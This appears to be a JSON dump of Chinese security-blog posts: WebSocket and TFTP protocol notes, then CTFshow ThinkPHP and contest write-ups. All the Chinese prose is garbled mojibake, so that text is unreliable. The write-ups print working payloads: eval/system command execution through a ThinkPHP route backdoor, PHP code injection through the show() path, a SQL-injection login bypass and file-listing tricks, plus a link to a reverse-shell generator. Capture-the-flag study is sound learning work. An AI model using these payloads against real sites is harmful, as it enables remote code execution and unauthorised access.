åœ¨è¿æ¥çš„å»ºç«‹è¿‡ç¨‹ä¸­å¯¹é”™è¯¯çš„å¤„ç†æ–¹å¼ç›¸åŒï¼Œåœ¨è¿™ä¸ªé˜¶æ®µWSå¯èƒ½è¿”å›å’ŒHTTPç›¸åŒçš„è¿”å›ç \n\nä¸åŒä¹‹å¤„åœ¨äºï¼š\n\n- WSä½¿ç”¨HTTPæ¥å»ºç«‹è¿æ¥ï¼Œä½†æ˜¯å®šä¹‰äº†ä¸€ç³»åˆ—æ–°çš„headeråŸŸï¼Œè¿™äº›åŸŸåœ¨HTTPä¸­å¹¶ä¸ä¼šä½¿ç”¨\n- WSçš„è¿æ¥ä¸èƒ½é€šè¿‡ä¸­é—´äººæ¥è½¬å‘ï¼Œå®ƒå¿…é¡»æ˜¯ä¸€ä¸ªç›´æ¥è¿æ¥\n- WSè¿æ¥å»ºç«‹ä¹‹åï¼Œé€šä¿¡åŒæ–¹éƒ½å¯ä»¥åœ¨ä»»ä½•æ—¶åˆ»å‘å¦ä¸€æ–¹å‘é€æ•°æ®\n- WSè¿æ¥å»ºç«‹ä¹‹åï¼Œæ•°æ®çš„ä¼ è¾“ä½¿ç”¨å¸§æ¥ä¼ é€’ï¼Œä¸å†éœ€è¦Requestæ¶ˆæ¯\n- WSçš„æ•°æ®å¸§æœ‰åº\n\n![img](https://img-blog.csdnimg.cn/20200527233222508.png)\n\nè¿™é‡Œæ˜¯ä¸€ä¸ªå®Œæ•´çš„websocketçš„è¿‡ç¨‹æ•°æ®æµ\n\n```\nGET / HTTP/1.1\nHost: localhost:3000\nPragma: no-cache\nAccept: */*\nSec-WebSocket-Key: bI1MuDR3aJuRuf8JYLkqVw==\nSec-WebSocket-Version: 13\nAccept-Language: zh-CN,zh-Hans;q=0.9\nSec-WebSocket-Extensions: permessage-deflate\nCache-Control: no-cache\nAccept-Encoding: gzip, deflate\nOrigin: null\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15\nConnection: Upgrade\nUpgrade: websocket\n\nHTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: NLLgtF7B4DX8+2TpfNbpeL/vprw=\n\n..\"c_.Z\n>.Q\n..ECHO: xiaosi..\"|.xZ...Q...ECHO: xiaosi..h..J...%....ECHO: xiaosi....L...-.....ECHO: xiaosi...+~L.B.#.B..ECHO: xiaosi..d...........ECHO: xiaosi........t.....ECHO: xiaosi..F...>...5...ECHO: xiaosi\n```\n\n- ç¬¬ä¸€è¡Œä¸ºä¸ºè¯·æ±‚çš„æ–¹æ³•ï¼Œç±»å‹å¿…é¡»ä¸ºGETï¼Œåè®®ç‰ˆæœ¬å·å¿…é¡»å¤§äº1.1\n- Upgradeå­—æ®µå¿…é¡»åŒ…å«ï¼Œå€¼ä¸ºwebsocket\n- Connectionå­—æ®µå¿…é¡»åŒ…å«ï¼Œå€¼ä¸ºUpgrade\n- Sec-WebSocket-Keyå­—æ®µå¿…é¡»åŒ…å« ï¼Œè®°å½•ç€æ¡æ‰‹è¿‡ç¨‹ä¸­å¿…ä¸å¯å°‘çš„é”®å€¼ã€‚\n- Sec-WebSocket-Protocolå­—æ®µå¿…é¡»åŒ…å« ï¼Œè®°å½•ç€ä½¿ç”¨çš„å­åè®®\n\n\n\n## TFTP\n\nTFTP(Trival File Transfer Protocalï¼Œç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼‰è¯¥åè®®åœ¨ç†ŸçŸ¥ç«¯å£69ä¸Šä½¿ç”¨UDPæœåŠ¡ã€‚TFTPåè®®å¸¸ç”¨äºæ— ç›˜å·¥ä½œç«™æˆ–è·¯ç”±å™¨ä»åˆ«çš„ä¸»æœºä¸Šè·å–å¼•å¯¼é…ç½®æ–‡ä»¶ï¼Œç”±äºTFTPæŠ¥æ–‡æ¯”è¾ƒå°ï¼Œèƒ½å¤Ÿè¿…é€Ÿå¤åˆ¶è¿™äº›æ–‡ä»¶ã€‚\n\nä¼˜ç‚¹ï¼šTFTPåè®®ä»£ç æ‰€å ç”¨çš„å†…å­˜å°ï¼Œå…¶å¯¹åº”çš„è½¯ä»¶ä¹Ÿå¾ˆå°ï¼Œæ‰€ä»¥èƒ½ä¸ªå¾ˆå®¹æ˜“åœ°æ”¾å…¥åˆ°æ— ç›˜å·¥ä½œç«™çš„ROMä¸­ï¼ŒTFTPæ”¯æŒASCIIç æˆ–äºŒè¿›åˆ¶ä¼ é€ã€‚\n\nä¼ è¾“è¿‡ç¨‹\n\nä»¥TFTPå®¢æˆ·å‘TFTPæœåŠ¡å™¨å‘é€è¯»è¯·æ±‚ä¸ºä¾‹ï¼Œè¯´æ˜æ•´ä¸ªè¿‡ç¨‹ã€‚\n\n1. æœåŠ¡å™¨ä½¿ç”¨ç†ŸçŸ¥ç«¯å£å·69è¢«åŠ¨æ‰“å¼€è¿æ¥ï¼›\n2. å®¢æˆ·ä¸»åŠ¨æ‰“å¼€è¿æ¥ï¼Œå®ƒä½¿ç”¨ä¸´æ—¶ç«¯å£ä½œä¸ºæºç«¯å£è€Œç†ŸçŸ¥ç«¯å£69ä½œä¸ºç›®çš„ç«¯å£ï¼Œå‘æœåŠ¡å™¨è¿›ç¨‹å‘é€RRQæŠ¥æ–‡ï¼›\n3. æœåŠ¡å™¨ä¸»åŠ¨æ‰“å¼€è¿æ¥ï¼Œå®ƒä½¿ç”¨æ–°çš„ä¸´æ—¶ç«¯å£ä½œä¸ºæºç«¯å£ï¼Œè€Œä½¿ç”¨æ”¶åˆ°çš„æ¥è‡ªå®¢æˆ·çš„ä¸´æ—¶ç«¯å£ä½œä¸ºç›®çš„ç«¯å£ï¼Œå‘TFTPå®¢æˆ·è¿›ç¨‹å‘é€DATAæŠ¥æ–‡ï¼ˆ2Bæ“ä½œç ï¼Œ2Bæ•°æ®å—çš„å—å·Kï¼Œ512Bæ•°æ®ï¼‰ï¼›\n4. å®¢æˆ·æ”¶åˆ°æœåŠ¡å™¨çš„æŠ¥æ–‡åï¼Œå‘é€4Bçš„ACKï¼ˆ2Bçš„æ“ä½œç å’Œ2Bçš„æ•°æ®å—å·ï¼‰ç»™TFTPæœåŠ¡å™¨ï¼Œå‘Šè¯‰å®ƒä¹‹å‰å‘é€ç»™å®¢æˆ·çš„æ•°æ®æŠ¥å·²ç»æ”¶åˆ°ï¼›\n5. é‡å¤æ­¥éª¤3-4ï¼Œç›´åˆ°æ‰€æœ‰è¯·æ±‚çš„æ•°æ®å‘é€å®Œæ¯•ã€‚\n\n![img](https://upload-images.jianshu.io/upload_images/2256198-62dba3beb7cb0353.png)\n\n"},{"title":"CTFshowThinkPHPä¸“é¢˜","url":"/posts/80a6314c.html","content":"\n# ThinkPHP\n\nä¸€äº›ThinkPHPçš„åŸºç¡€çŸ¥è¯†ï¼š\n\n1. [å…³äºThinkPHPçš„æ¨¡å—åŒ–è®¾è®¡](https://www.kancloud.cn/manual/thinkphp/1696)\n2. [å…³äºThinkPHPçš„é—­åŒ…æ”¯æŒ](https://www.kancloud.cn/manual/thinkphp/1710)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**569**\n\nçŸ¥é“æ¨¡å—åŒ–è®¾è®¡å°±å¾ˆç®€å•äº†\n\n```\nå…¸å‹è®¿é—®è§„åˆ™\nhttp://serverName/index.phpï¼ˆæˆ–è€…å…¶ä»–åº”ç”¨å…¥å£æ–‡ä»¶ï¼‰/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...]\n/index.php/Admin/Login/ctfshowLogin\n```\n\n**570**\n\né—­åŒ…è·¯ç”±ï¼Œç±»ä¼¼äºå°†/åè·¯å¾„ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè®¾å®šé—­åŒ…è·¯ç”±çš„æ–‡ä»¶åœ¨æ–‡ä»¶æ ¹ç›®å½•/Common/Conf/config.phpä¸­\n\n```php\n    'URL_ROUTER_ON'   => true, \n\t'URL_ROUTE_RULES' => array(\n    'ctfshow/:f/:a' =>function($f,$a){\n    \tcall_user_func($f, $a);\n    \t}\n    )\n```\n\nä¸€ä¸ªæ˜æ˜¾çš„åé—¨ï¼Œpayloadå¦‚ä¸‹\n\n```\n/index.php/ctfshow/assert/eval($_POST[1])\nPOST:\n1=system('tac /*');\n```\n\n**571**\n\nshowæ–¹æ³•å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ\n\n> ## æ¸²æŸ“å†…å®¹\n>\n> å¦‚æœä½ æ²¡æœ‰å®šä¹‰ä»»ä½•æ¨¡æ¿æ–‡ä»¶ï¼Œæˆ–è€…æŠŠæ¨¡æ¿å†…å®¹å­˜å‚¨åˆ°æ•°æ®åº“ä¸­çš„è¯ï¼Œä½ å°±éœ€è¦ä½¿ç”¨showæ–¹æ³•æ¥æ¸²æŸ“è¾“å‡ºäº†ï¼Œshowæ–¹æ³•çš„è°ƒç”¨æ ¼å¼ï¼š\n>\n> ```\n> show('æ¸²æŸ“å†…å®¹'[,'å­—ç¬¦ç¼–ç '][,'è¾“å‡ºç±»å‹'])ä¾‹å¦‚ï¼Œ$this->show($content);\n> ä¹Ÿå¯ä»¥æŒ‡å®šç¼–ç å’Œç±»å‹ï¼š $this->show($content, 'utf-8', 'text/xml');\n> ```\n\né‚£ä¹ˆæˆ‘ä»¬å»çœ‹çœ‹showæ–¹æ³•åˆ°åº•æ‰§è¡Œäº†ä»€ä¹ˆ\n\n```php\nprotected function show($content,$charset='',$contentType='',$prefix='') {\n    $this->view->display('',$charset,$contentType,$content,$prefix);\n}\n```\n\nå¾€ä¸‹çœ‹è°ƒç”¨çš„displayæ–¹æ³•\n\n```php\npublic function display($templateFile='',$charset='',$contentType='',$content='',$prefix='') {\n    G('viewStartTime');\n    // è§†å›¾å¼€å§‹æ ‡ç­¾\n    Hook::listen('view_begin',$templateFile);\n    // è§£æå¹¶è·å–æ¨¡æ¿å†…å®¹\n    $content = $this->fetch($templateFile,$content,$prefix);\n    // è¾“å‡ºæ¨¡æ¿å†…å®¹\n    $this->render($content,$charset,$contentType);\n    // è§†å›¾ç»“æŸæ ‡ç­¾\n    Hook::listen('view_end');\n}\n```\n\n```php\npublic function fetch($templateFile='',$content='',$prefix='') {\n    if(empty($content)) {\n        $templateFile   =   $this->parseTemplate($templateFile);\n        // æ¨¡æ¿æ–‡ä»¶ä¸å­˜åœ¨ç›´æ¥è¿”å›\n        if(!is_file($templateFile)) E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);\n    }else{\n        defined('THEME_PATH') or    define('THEME_PATH', $this->getThemePath());\n    }\n    // é¡µé¢ç¼“å­˜\n    ob_start();\n    ob_implicit_flush(0);\n    if('php' == strtolower(C('TMPL_ENGINE_TYPE'))) { // ä½¿ç”¨PHPåŸç”Ÿæ¨¡æ¿\n        $_content   =   $content;\n        // æ¨¡æ¿é˜µåˆ—å˜é‡åˆ†è§£æˆä¸ºç‹¬ç«‹å˜é‡\n        extract($this->tVar, EXTR_OVERWRITE);\n        // ç›´æ¥è½½å…¥PHPæ¨¡æ¿\n        empty($_content)?include $templateFile:eval('?>'.$_content);\n    }else{\n        // è§†å›¾è§£ææ ‡ç­¾\n        $params = array('var'=>$this->tVar,'file'=>$templateFile,'content'=>$content,'prefix'=>$prefix);\n        Hook::listen('view_parse',$params);\n    }\n    // è·å–å¹¶æ¸…ç©ºç¼“å­˜\n    $content = ob_get_clean();\n    // å†…å®¹è¿‡æ»¤æ ‡ç­¾\n    Hook::listen('view_filter',$content);\n    // è¾“å‡ºæ¨¡æ¿æ–‡ä»¶\n    return $content;\n}\n```\n\nåœ¨`TMPL_ENGINE_TYPE=='php'`æ—¶ï¼Œå…³é”®å°±åœ¨è¿™å¥è¯äº†`include $templateFile:eval('?>'.$_content);`æ­¤å¤„çš„`$_content`æˆ‘ä»¬æ˜¯å®Œå…¨å¯æ§çš„ï¼Œä¹Ÿå°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤\n\nè€Œå½“`TMPL_ENGINE_TYPE!='php'`æ—¶ï¼Œæ‰§è¡Œçš„Hookä¸­çš„listenæ–¹æ³•ï¼Œç„¶åæ‰§è¡Œexecæ–¹æ³•ï¼Œç„¶årunæ–¹æ³•ï¼Œæœ€ååŠ è½½å¹¶åŒ…å«ä¸€ä¸ªç¼“å­˜æ–‡ä»¶\n\n```php\nstatic public function listen($tag, &$params=NULL) {\n    if(isset(self::$tags[$tag])) {\n        if(APP_DEBUG) {\n            G($tag.'Start');\n            trace('[ '.$tag.' ] --START--','','INFO');\n        }\n        foreach (self::$tags[$tag] as $name) {\n            APP_DEBUG && G($name.'_start');\n            $result =   self::exec($name, $tag,$params);\n            if(APP_DEBUG){\n                G($name.'_end');\n                trace('Run '.$name.' [ RunTime:'.G($name.'_start',$name.'_end',6).'s ]','','INFO');\n            }\n            if(false === $result) {\n                // å¦‚æœè¿”å›false åˆ™ä¸­æ–­æ’ä»¶æ‰§è¡Œ\n                return ;\n            }\n        }\n        if(APP_DEBUG) { // è®°å½•è¡Œä¸ºçš„æ‰§è¡Œæ—¥å¿—\n            trace('[ '.$tag.' ] --END-- [ RunTime:'.G($tag.'Start',$tag.'End',6).'s ]','','INFO');\n        }\n    }\n    return;\n}\n```\n\n```\npublic function load($_filename,$vars=null){\n    if(!is_null($vars))\n        extract($vars, EXTR_OVERWRITE);\n    eval('?>'.$this->read($_filename));\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\næœ€ç»ˆpayload\n\n```\n/index.php/Home/Index/index?n=<?php%20system(%27tac%20/*%27);?>\n```\n\n**572**\n\nThinkPHPæ—¥å¿—æ–‡ä»¶\n\né¢˜ç›®ä¸­æåˆ°äº†çˆ†ç ´ï¼Œåœ¨thinkphpå¼€å¯debugçš„æƒ…å†µä¸‹ä¼šåœ¨Runtimeç›®å½•ä¸‹ç”Ÿæˆlogæ–‡ä»¶ï¼Œæ–‡ä»¶çš„åç§°æ˜¯ä»¥`å¹´_æœˆ_æ—¥.log`æ¥å‘½åçš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ¥çˆ†ç ´æ–‡ä»¶å\n\n```\n/Application/Runtime/Logs/Home/xx_xx_xx.log\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206131917820.png)\n\næ‰«å‡ºäº†è¿™ä¹ˆä¸ªæ–‡ä»¶ï¼Œå‘ç°ä¼¼ä¹ä¼ å‚showctfå¯æ‰§è¡Œphpä»£ç ï¼Œæ‹¿åˆ°flag\n\n**573**\n\n**ThinkPHP 3.2.3sqlæ³¨å…¥æ¼æ´**\n\nå…ˆå†™ä¸ªå¯ä»¥è°ƒç”¨å†…ç½®sqlæŸ¥è¯¢çš„ä¸»é¡µ\n\n```\nclass IndexController extends Controller {\n    public function index(){\n    $a=M('xxx');  //è¡¨å\n    $id=I('GET.id');\n    $b=$a->find($id);\n    var_dump($b);\n    }\n}\n```\n\nåœ¨Iæ–¹æ³•ä¸­å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œé»˜è®¤è¿‡æ»¤å™¨`DEFAULT_FILTER`æ˜¯ä¸ä¼šå¯¹å•å¼•å·åšè¿‡æ»¤æ“ä½œçš„ï¼Œæ‰€ä»¥æ­¤å¤„ä¸ç”¨ç®¡ï¼Œä¸‹é¢èµ°`think_filter`æ–¹æ³•ï¼Œè¿™é‡Œå¯¹ä¸€äº›æ•æ„Ÿå®‰å…¨å†…å®¹è¿›è¡Œäº†è¿‡æ»¤\n\n```php\nfunction think_filter(&$value){\n\t// TODO å…¶ä»–å®‰å…¨è¿‡æ»¤\n\t// è¿‡æ»¤æŸ¥è¯¢ç‰¹æ®Šå­—ç¬¦\n    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value)){\n        $value .= ' ';\n    }\n}\n```\n\nOKï¼Œè¾“å…¥æ£€æŸ¥å®Œæ¯•ï¼Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹è¿›å…¥åˆ°`find`æ–¹æ³•ä¸­ï¼Œè¿™é‡Œçš„æ³¨é‡Šä¹Ÿå¯¹æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°åšäº†è¯¦ç»†çš„è§£é‡Šï¼Œä¸‹ä¸€æ­¥è¿›ä¸€æ­¥è·Ÿè¸ª`_parseOptions`æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¸ª`_parseType`æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯¹å†…å®¹ç±»å‹è¿›è¡Œè§£æ\n\n```php\n/**\n * æŸ¥è¯¢æ•°æ®\n * @access public\n * @param mixed $options è¡¨è¾¾å¼å‚æ•°\n * @return mixed\n */\n```\n\n```\nif(is_scalar($val)) {\n    $this->_parseType($options['where'],$key);\n}\n```\n\n```\nelseif(false === strpos($fieldType,'bigint') && false !== strpos($fieldType,'int')) {\n                $data[$key]   =  intval($data[$key]);\n```\n\n\n\n\n\nå…ˆæ”¾ä¸€ä¸ªyuå¸ˆå‚…çš„[ä»£ç å®¡è®¡](https://blog.csdn.net/miuzzx/article/details/119424071)ï¼Œä»¥åå†å›æ¥çœ‹\n\n**574**\n"},{"title":"å¤§ä½¬æ–‡ç« åˆé›†","url":"/posts/f85e0a9a.html","content":"\n### [[CTF]PHPååºåˆ—åŒ–æ€»ç»“](https://blog.csdn.net/solitudi/article/details/113588692?utm_source=app&app_version=5.0.1&code=app_1562916241&uLinkId=usr1mkqgl919blen)\n\n### [[CTF].htaccessçš„ä½¿ç”¨æŠ€å·§æ€»ç»“](https://blog.csdn.net/solitudi/article/details/116666720)\n\n### [Webå®‰å…¨å­¦ä¹ ç¬”è®°](https://websec.readthedocs.io/zh/latest/index.html)\n\n### [Java Webå®‰å…¨](https://javasec.org)\n\n### [åå¼¹shellå‘½ä»¤ç”Ÿæˆå™¨](https://www.revshells.com)\n\n### [PHPä¸­SESSIONååºåˆ—åŒ–æœºåˆ¶](https://blog.spoock.com/2016/10/16/php-serialize-problem/)\n\n### [Java Webå…¥é—¨](https://www.bookstack.cn/read/Heart-First-JavaWeb/source-README.md)\n\n### [ä»ä¸€ä¸ªç»•è¿‡é•¿åº¦é™åˆ¶çš„ XSS ä¸­ï¼Œæˆ‘ä»¬èƒ½å­¦åˆ°ä»€ä¹ˆï¼Ÿ](https://www.tr0y.wang/2020/08/18/IDN/)\n\n"},{"title":"CTFshowå¤§èµ›åŸé¢˜","url":"/posts/76fe6b8e.html","content":"\n**680**\n\npostä¼ å…¥`code=phpinfo();`æ‰§è¡ŒæˆåŠŸï¼ŒæŸ¥çœ‹è¢«banå‡½æ•°ï¼Œæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨åŸç”Ÿç±»æŸ¥çœ‹æ–‡ä»¶\n\n```\ncode=$a=new FilesystemIterator(\".\");var_dump ($a);\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090028188.png)\n\nä¸‹è½½æ–‡ä»¶å³å¯\n\n**681**\n\næŠ“åŒ…å‘ç°è¿”å›å†…å®¹ä¸ºsqlè¯­å¥\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090039242.png)\n\nè¿‡æ»¤äº†ç©ºæ ¼å’Œå¼•å·ï¼Œä¼šè¢«åï¼Œå°è¯•æ„é€ payloadï¼Œå‘ç°#å¯ç”¨ï¼Œ\\å¯ç”¨ï¼Œæ„é€ è¯­å¥`||1#\\`æ­¤æ—¶æ‰§è¡Œè¯­å¥ä¸º\n\n```sql\nselect count(*) from ctfshow_users where username = '||1#\\' or nickname = '||1#\\'\n```\n\nç›¸å½“äºåˆ¤æ–­usernameæ˜¯å¦ç­‰äº`||1' or nickname = `è¿™ä¸€å­—ç¬¦ä¸²æˆ–ä¸€ï¼Œç»“æœæ°¸çœŸï¼Œç™»å½•å³å¯æ‹¿åˆ°flag\n\n**682**\n\nè¿™è¾ˆå­ç¬¬ä¸€æ¬¡ç¢°åˆ°jsä»£ç å®¡è®¡ï¼Œçœ‹å‘—\n\n```javascript\nvar c2n  = c =>{\n    if(c.length>1){\n        return 0\n    }\n\n    if(c.charCodeAt()>0x60 && c.charCodeAt()<0x67){\n        return c.charCodeAt()-0x57\n    }\n\n    if(parseInt(c)>0){\n        return parseInt(c)\n    }\n\n    return 0;\n}\n\nvar s2n2su = s =>{\n    r=0\n    for (var i = s.length - 1; i >= 0; i--) {\n        r+=c2n(s[i])\n    }\n    return r\n}\n\nfunction test(){\n    var m=document.getElementById(\"message\").value;\n    var e = 'error';\n    if(sha256(m)!==\"e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d\"){\n        return alert(e)\n    }\n    var start = m.substring(0,8);\n\n    if(start!=='ctfshow{'){\n        return alert(e);\n    }\n    if(m.substring(m.length,m.length-1)!==\"}\"){\n        return alert(e);\n    }\n    var s = m.substring(8,m.length-1)\n    if(s.length!==36){\n        return alert(e);\n    }\n    var k = s.split(\"-\")\n    if(k.length!==5){\n        return alert(e)\n    }\n    if(s2n2su(k[0])!==63){\n        return alert(e)\n    }\n    if(sha256(k[0].substr(0,4))!==\"c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400\"){\n        return alert(e)\n    }\n\n    if(sha256(k[0].substr(4,8))!==\"f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc\"){\n        return alert(e)\n    }\n\n\n\n    if(parseInt(k[1][0])!==(c2n('a')-1)){\n        return alert(e)\n    }\n\n    if(k[1][1]+k[1][2]+k[1][3]!=='dda'){\n        return alert(e)\n    }\n\n    if(k[2][1]!=='e'){\n        return alert(e)\n    }\n\n    if(k[2][0]+k[2][2]+k[2][3]!=0x1ae){\n        return alert(e)\n    }\n\n\n    if(parseInt(k[3][0])!==(c2n('a')-1)){\n        return alert(e)\n    }\n\n    if(parseInt(k[3][1])!==parseInt(k[3][3])){\n        return alert(e)\n    }\n\n    if(parseInt(k[3][3])*2+c2n('a')!==0x12){\n        return alert(e)\n    }\n\n    if(sha224(k[3][2])!=='abd37534c7d9a2efb9465de931cd7055ffdb8879563ae98078d6d6d5'){\n        return alert(e)\n    }\n\n    if(st3(k[4])!=='GVSTMNDGGQ2DSOLBGUZA===='){\n        return alert(e)\n    }\n\n    alert('you are right')\n}\n\n\n\n\nconst Base64 = {\n    _keyStr: \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\",\n    encode: function (e) {\n        var t = \"\";\n        var n, r, i, s, o, u, a;\n        var f = 0;\n        e = Base64._utf8_encode(e);\n        while (f < e.length) {\n            n = e.charCodeAt(f++);\n            r = e.charCodeAt(f++);\n            i = e.charCodeAt(f++);\n            s = n >> 2;\n            o = (n & 3) << 4 | r >> 4;\n            u = (r & 15) << 2 | i >> 6;\n            a = i & 63;\n            if (isNaN(r)) {\n                u = a = 64\n            } else if (isNaN(i)) {\n                a = 64\n            }\n            t = t + this._keyStr.charAt(s) + this._keyStr.charAt(o) + this._keyStr.charAt(u) + this._keyStr.charAt(a)\n        }\n        return t\n    },\n    decode: function (e) {\n        var t = \"\";\n        var n, r, i;\n        var s, o, u, a;\n        var f = 0;\n        e = e.replace(/[^A-Za-z0-9+/=]/g, \"\");\n        while (f < e.length) {\n            s = this._keyStr.indexOf(e.charAt(f++));\n            o = this._keyStr.indexOf(e.charAt(f++));\n            u = this._keyStr.indexOf(e.charAt(f++));\n            a = this._keyStr.indexOf(e.charAt(f++));\n            n = s << 2 | o >> 4;\n            r = (o & 15) << 4 | u >> 2;\n            i = (u & 3) << 6 | a;\n            t = t + String.fromCharCode(n);\n            if (u != 64) {\n                t = t + String.fromCharCode(r)\n            }\n            if (a != 64) {\n                t = t + String.fromCharCode(i)\n            }\n        }\n        t = Base64._utf8_decode(t);\n        return t\n    },\n    _utf8_encode: function (e) {\n        e = e.replace(/rn/g, \"n\");\n        var t = \"\";\n        for (var n = 0; n < e.length; n++) {\n            var r = e.charCodeAt(n);\n            if (r < 128) {\n                t += String.fromCharCode(r)\n            } else if (r > 127 && r < 2048) {\n                t += String.fromCharCode(r >> 6 | 192);\n                t += String.fromCharCode(r & 63 | 128)\n            } else {\n                t += String.fromCharCode(r >> 12 | 224);\n                t += String.fromCharCode(r >> 6 & 63 | 128);\n                t += String.fromCharCode(r & 63 | 128)\n            }\n        }\n        return t\n    },\n    _utf8_decode: function (e) {\n        var t = \"\";\n        var n = 0;\n        var r = c1 = c2 = 0;\n        while (n < e.length) {\n            r = e.charCodeAt(n);\n            if (r < 128) {\n                t += String.fromCharCode(r);\n                n++\n            } else if (r > 191 && r < 224) {\n                c2 = e.charCodeAt(n + 1);\n                t += String.fromCharCode((r & 31) << 6 | c2 & 63);\n                n += 2\n            } else {\n                c2 = e.charCodeAt(n + 1);\n                c3 = e.charCodeAt(n + 2);\n                t += String.fromCharCode((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);\n                n += 3\n            }\n        }\n        return t\n    }\n}\n\n\n\nfunction st3(srcString) {\n    if (!srcString) {\n        return '';\n    }\n\n    let BASE32CHAR = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\";\n    let i = 0;\n    let index = 0;\n    let digit = 0;\n    let currByte;\n    let nextByte;\n    let retrunString = '';\n    srcString = Base64._utf8_encode(srcString);\n\n    for (let i = 0; i < srcString.length;) {\n        currByte = (srcString.charCodeAt(i) >= 0) ? srcString.charCodeAt(i)\n            : (srcString.charCodeAt(i) + 256);\n\n        if (index > 3) {\n            if ((i + 1) < srcString.length) {\n                nextByte = (srcString.charCodeAt(i + 1) >= 0)\n                    ? srcString.charCodeAt(i + 1)\n                    : (srcString.charCodeAt(i + 1) + 256);\n            } else {\n                nextByte = 0;\n            }\n\n            digit = currByte & (0xFF >> index);\n            index = (index + 5) % 8;\n            digit <<= index;\n            digit |= (nextByte >> (8 - index));\n            i++;\n        } else {\n            digit = (currByte >> (8 - (index + 5))) & 0x1F;\n            index = (index + 5) % 8;\n\n            if (index == 0) {\n                i++;\n            }\n        }\n\n        retrunString = retrunString + BASE32CHAR.charAt(digit);\n    }\n    while((retrunString.length % 8) !== 0){\n        retrunString += \"=\";\n    }\n    return retrunString;\n}\n```\n\nåˆ†æä»£ç ï¼Œè¦æ±‚flagç¬¦åˆä¸‹åˆ—æ¡ä»¶\n\n1. å‰å…«ä½ä¸ºå­—ç¬¦ä¸²`ctfshow{`ï¼Œç»“å°¾ä¸º`}`\n2. flagç»è¿‡sha256è¿ç®—çš„ç»“æœä¸º`e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d`\n3. ä¸­é—´å†…å®¹é•¿åº¦ä¸º36ï¼Œæœ‰4ä¸ªUUIDåˆ†å—`-`\n4. c2nå‡½æ•°çš„ä½œç”¨ï¼šå°†UUIDä¸­çš„å†…å®¹è½¬æ¢ä¸º10è¿›åˆ¶æ•°\n5. s2n2suå‡½æ•°çš„ä½œç”¨ï¼šå°†UUIDä¸­æ¯ä¸€ä½çš„æ•°å­—ç›¸åŠ å¹¶è¿”å›æœ€ç»ˆçš„å€¼\n6. ç¬¬ä¸€ä¸ªUUIDåˆ†æ®µçš„UUIDå’Œå€¼ä¸º63\n7. ç¬¬ä¸€ä¸ªUUIDåˆ†æ®µçš„å‰å››ä½ç»è¿‡sha256è¿ç®—åçš„ç»“æœæ˜¯`c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400`ï¼Œç»“æœä¸º`592b`\n8. ç¬¬ä¸€ä¸ªUUIDåˆ†æ®µå4ä½ç»è¿‡sha256è¿ç®—åçš„ç»“æœæ˜¯`f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc`ï¼Œç»“æœä¸º`9d77`\n9. ç¬¬äºŒä¸ªUUIDåˆ†æ®µæ˜¯`9dda`\n10. ç¬¬ä¸‰ä¸ªUUIDçš„ç¬¬äºŒä½æ˜¯eï¼Œå¹¶ä¸”å‰©ä½™ä¸‰ä½çš„è¿æ¥åä¸º430\n11. ç¬¬å››ä¸ªUUIDä¸º`94a4`\n12. ç¬¬äº”ä¸ªUUIDç»è¿‡base32ç¼–ç ç»“æœä¸º`GVSTMNDGGQ2DSOLBGUZA====`\n\næœ€ç»ˆæ„é€ å‡ºflag\n\n```\nctfshow{592b9d77-9dda-4e30-94a4-5e64f4499a52}\n```\n\né¡ºä¾¿è´´ä¸ªçˆ†ç ´è„šæœ¬\n\n```python\nimport hashlib\nfrom itertools import *\nstring=\"0123456789abcdef\"\nk=product(string,repeat=4)\nfor i in k:\n    aaa=\"\".join(i)\n    out1 = hashlib.sha256(aaa.encode(\"utf-8\")).hexdigest()\n    if(out1=='c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400'):\n        print(aaa)\n    if(out1=='f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc'):\n        print(aaa)\n```\n\n**683**\n\næ˜æ˜¾çš„å¼±ç±»å‹æ¯”è¾ƒ\n\n```php\n<?php \n   include \"flag.php\"; \n   if(isset($_GET['ç§€'])){ \n       if(!is_numeric($_GET['ç§€'])){ \n          die('å¿…é¡»æ˜¯æ•°å­—'); \n       }else if($_GET['ç§€'] < 60 * 60 * 24 * 30 * 2){ \n          die('ä½ å¤ªçŸ­äº†'); \n       }else 